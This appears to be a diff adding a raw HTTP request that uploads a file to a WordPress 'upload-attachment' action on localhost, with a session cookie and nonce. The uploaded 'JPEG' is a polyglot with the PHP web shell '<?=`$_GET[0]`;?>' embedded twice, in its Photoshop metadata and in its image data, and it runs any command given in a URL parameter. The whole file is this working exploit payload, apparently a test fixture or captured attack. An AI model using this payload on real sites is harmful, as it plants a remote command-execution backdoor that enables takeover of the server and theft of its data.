@@ -1,0 +1,33 @@
+POST /test/upload.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: wordpress_eff6f936d842f4e55a9cffe494d68111=test%7C1581590544%7C32P03LQ0WXrqWm8rkGuIMlzTQuFlYkBDNZQvB1i2lZn%7Ccd32f152374288cb2ccb71f28a324d25289d7e70ca9403e3c0e1e1418fee89a8;
+Content-Type: multipart/form-data; boundary=elImzQ2yFP
+Content-Length: 895
+Connection: close
+
+--elImzQ2yFP
+Content-Disposition: form-data; name="name"
+
+AQmrKyeNTG.jpg
+--elImzQ2yFP
+Content-Disposition: form-data; name="action"
+
+upload-attachment
+--elImzQ2yFP
+Content-Disposition: form-data; name="_wpnonce"
+
+c8c21c81ce
+--elImzQ2yFP
+Content-Disposition: form-data; name="async-upload"; filename="AQmrKyeNTG.jpg"
+Content-Type: image/jpeg
+
+JFIF``8Photoshop 3.0 8BIM t <?=`$_GET[0]`;?>;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 82
+C
+
+!'"#%%%),($+!$%$C			$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
+}!1AQa"q2#BR$3br
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+w!1AQaq"2B	#3Rbr
+$4%&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz?<?=`$_GET[0]`;?>
+--elImzQ2yFP--
